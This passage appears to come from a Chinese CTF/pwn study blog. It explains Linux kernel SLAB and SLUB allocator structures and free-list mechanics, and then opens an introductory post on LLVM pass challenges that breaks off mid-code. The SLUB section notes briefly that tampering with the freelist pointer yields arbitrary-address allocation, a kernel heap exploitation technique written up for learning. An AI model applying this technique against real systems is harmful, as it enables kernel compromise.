<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line">	<span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span>	<span class="comment">/* partial list first, better asm code */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> total_slabs;	<span class="comment">/* length of all slab lists */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> free_slabs;	<span class="comment">/* length of free slab list only */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> colour_next;	<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span>	<span class="comment">/* shared per node */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span>	<span class="comment">/* on other nodes */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> next_reap;	<span class="comment">/* updated without locking */</span></span><br><span class="line">	<span class="type">int</span> free_touched;		<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line">	<span class="type">atomic_long_t</span> total_objects;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里的<code>list_head</code>里面只保存了两个值：<code>next</code>指针和<code>prev</code>指针，也就是双向链表的经典结构。这里可以看到有三个双向链表：<code>slabs_partial</code>、<code>slabs_full</code>、<code>slabs_free</code>，分别保存的是<strong>内部有部分对象被分配的SLAB、内部所有对象都被分配的SLAB、内部所有对象都空闲的SLAB</strong>。这三个链表中的slab可以互相转化，如向一个所有对象都空闲的SLAB中申请空间成功后，这个SLAB就会从<code>slabs_free</code>移动到<code>slabs_partial</code>。</p>
<p>虽然文章开头参考的文章已经在一定程度上过时，但其中关于SLAB分配器的实现原理和思想却一直沿用至今。在5.18.19版本的<code>page</code>结构体中，已经找不到参考文章中的一些关键结构，不过这不影响我们对SLAB本身的分析。</p>
<p>下面是5.18.19版本内核的<code>slab</code>结构体声明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">	<span class="type">void</span> *freelist;	<span class="comment">/* array of free object indexes */</span></span><br><span class="line">	<span class="type">void</span> *s_mem;	<span class="comment">/* first object */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line">			<span class="type">int</span> slabs;	<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">		&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line">	<span class="comment">/* Double-word boundary */</span></span><br><span class="line">	<span class="type">void</span> *freelist;		<span class="comment">/* first free object */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">			<span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">			<span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">	<span class="type">void</span> *__unused_1;</span><br><span class="line">	<span class="type">void</span> *freelist;		<span class="comment">/* first free block */</span></span><br><span class="line">	<span class="type">long</span> units;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，历史版本中的诸如<code>s_mem</code>等关键控制结构体从<code>page</code>移到了<code>slab</code>中。由此，<code>page</code>结构体中也就不需要定义这些属性了。<code>s_mem</code>指向的是该SLAB分配器中的第一个对象，而<code>freelist</code>指向的是一个重要的标识对象使用情况的结构，我们接下来就会提到。这两个指针指向同一页中的不同地址，其中如果一个<code>page</code>被用作SLAB分配器，那么它的<code>virtual</code>（<code>page</code>中的最后一个属性）属性值与SLAB中的<code>freelist</code>指向相同地址。</p>
<p>关于SLAB内的分配机制，以下面一张图进行展示，其中需要注意的是：<strong>分配到哪一个对象不是外界能够决定的，而释放哪一个对象是外界能够决定的</strong>。如下图所示的分配方式能够最大限度保证分配到的对象是最近释放的。<strong><font color=red>在进行分配时，active读取其索引指向的值，并向前移动一位，在进行释放时，active首先回退一位，在将这一位对应的索引值修改为被释放的对象的索引值。</font></strong><br />
<img src="https://img-blog.csdnimg.cn/d9a0ac33729040e594f95bd884fffa23.png" alt="" /><br />
在这种分配机制下，很容易判断一个SLAB中的对象究竟是全部分配，还是全部释放，还是部分分配。因为分配对应一次索引值前移，而释放对应一次索引值后移，只要索引值为0，这个SLAB就一定为空；只要索引值等于SLAB中对象的个数-1，这个SLAB就一定为满。</p>
<p>看到这里，我们对于SLAB的分配机制应该有了一个基本的认识，但是SLAB中还有一个<strong>染色</strong>的问题。有了上面的组织形式，SLAB已经能够作为一个成熟的内存分配器了，至于为什么要添加染色的机制，主要是为了性能的考虑：</p>
<blockquote>
<p>我们知道内存需要处理时要先放入CPU硬件高速缓存中，而CPU硬件高速缓存与内存的映射方式有多种。在同一个kmem_cache中所有SLAB都是相同大小，都是相同连续长度的页框组成，这样的话在不同SLAB中相同对象号对于页框的首地址的偏移量也相同，这样有很可能导致不同SLAB中相同对象号的对象放入CPU硬件高速缓存时会处于同一行，当我们交替操作这两个对象时，CPU的cache就会交替换入换出，效率就非常差。SLAB着色就是在同一个kmem_cache中对不同的SLAB添加一个偏移量，就让相同对象号的对象不会对齐，也就不会放入硬件高速缓存的同一行中，提高了效率。</p>
</blockquote>
<blockquote>
<p>着色空间就是前端的空闲区域，这个区有大小都是在分配新的SLAB时计算好的，计算方法很简单，node结点对应的kmem_cache_node中的colour_next乘上kmem_cache中的colour_off就得到了偏移量，然后colour_next++，当colour_next等于kmem_cache中的colour时，colour_next回归到0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">偏移量 = kmem_cache.colour_off * kmem_cache.node[NODE_ID].colour_next;</span><br><span class="line"></span><br><span class="line">kmem_cache.node[NODE_ID].colour_next++;</span><br><span class="line"><span class="keyword">if</span> (kmem_cache.node[NODE_ID].colour_next == kmem_cache.colour)</span><br><span class="line">    kmem_cache.node[NODE_ID].colour_next = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="3-slub系统介绍"><a class="markdownIt-Anchor" href="#3-slub系统介绍"></a> 3. SLUB系统介绍</h1>
<p>说完了SLAB，终于可以开始我们的重点——SLUB系统了。都说SLUB系统是SLAB的升级版，那么SLUB到底比SLAB升级在什么地方呢？</p>
<p>简单地来说，<strong>首先SLUB直接删掉了两个SLAB链表，即在SLAB节点中表示全空和全满的对象链表，只保留了一个部分满的SLAB链表。其次，在<code>slab</code>结构体内部也有很大的变化，删去了SLAB中指引内存分配的关键的数组结构和描述符数组，而只是使用一个指针形成链表，将所有空闲的对象串连在一起：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/aaf4d2e6746849d1ab424e47cd21ff2e.png" alt="" /><br />
（原文是有贴图的，但是在笔者的windows系统下加载不出来，在ubuntu倒是可以加载出来。上图选自<a target="_blank" rel="noopener" href="https://blog.csdn.net/wh8_2011/article/details/52287557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-52287557-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">资料</a>）</p>
<p>注意slab和slub分别使用了不同的<code>kmem_cache</code>结构体，分别定义在<code>/include/linux/slab_def.h</code>和<code>/include/linux/slub_def.h</code>中。上面解释SLAB的时候使用的是<code>/include/linux/slab_def.h</code>的结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line">	<span class="type">slab_flags_t</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;	<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset;	<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line">	<span class="comment">/* Number of per cpu partial slabs to keep around */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> cpu_partial_slabs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="type">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="type">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在SLUB的<code>kmem_cache</code>中，有一个<code>kmem_cache_cpu</code>结构体指针，这是SLUB分配器的描述符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">local_lock_t</span> lock;	<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">	<span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>结构如下图所示（图片选自<a target="_blank" rel="noopener" href="https://blog.csdn.net/whenloce/article/details/88949002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-88949002-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">资料</a>）</p>
<p><img src="https://img-blog.csdnimg.cn/2019062509524131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doZW5sb2Nl,size_16,color_FFFFFF,t_70" alt="" /><br />
其中需要重点关注的就是<code>freelist</code>，里面保存的就是对象本身，以链表连接。在上一篇文章中，我们使用了SLUB的结构特性实现了利用，在那道题中，读者可以进行调试发现，对象内部的内容非常简单，空闲的对象开头8字节保存的就是下一个空闲对象的地址，以链表形式连接，在释放一个对象时，会将该对象放在<code>freelist</code>链表头部。这也就是为什么在上一题中通过修改指针的值就可以让SLUB为我们分配到任意地址了。<strong>在实际的pwn利用中，有一个思路就是恶意篡改SLUB中的<code>freelist</code>，破坏链表以实现任意地址分配，后续可能可以进行任意地址读写</strong>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">LLVM pass pwn 入门 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:27:40 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:40+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，pwn题出的可谓是越来越花，从C++到kernel，再到Rust、Go、Java一众语言，还有LLVM。其中LLVM在各种比赛中的出现频率越来越高，值得引起重视。借这篇文章，笔者开始LLVM pass类pwn题的入门。</p>
<p>首先，既然要研究LLVM，就要清楚LLVM到底是什么。</p>
<blockquote>
<p>它是以C++编写的构架编译器的框架系统。用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。（摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/yayaayaya123/article/details/83993041?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165728197316781818799638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165728197316781818799638&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83993041-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=LLVM&amp;spm=1018.2226.3001.4187">资料</a>）</p>
</blockquote>
<p>LLVM在编译过程中实际上发挥了一个牵线搭桥的作用。高级语言多种多样，但无论是哪一种语言的编译器，都需要对高级语言编写的代码进行词法与句法分析，这是编译器前端部分的工作。在分析完成后，前端会输出一个抽象语法树AST，由LLVM进行分析与优化，转化为中间表示IR。再由编译器后端根据IR生成可供执行的二进制代码。</p>
<blockquote>
<p>而pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。<br />
大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。（摘自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>）</p>
</blockquote>
<p>下面，笔者使用Ubuntu 20.04系统进行第一个LLVM pass的编写测试。</p>
<p>首先安装Clang：<code>apt install clang</code>，在Ubuntu 20.04安装clang会附带安装llvm-9和llvm-10，经过测试发现，只有llvm-10能够正常使用，用llvm-9的库编译会报错。</p>
<p>这里借<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>中的测试代码编写：</p>
<p>myFirstLLVMpass.cpp:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span><span class="comment">//写Pass所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span><span class="comment">//操作函数所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span><span class="comment">//打印输出所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//声明匿名空间，被声明的内容仅在文件内部可见</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> 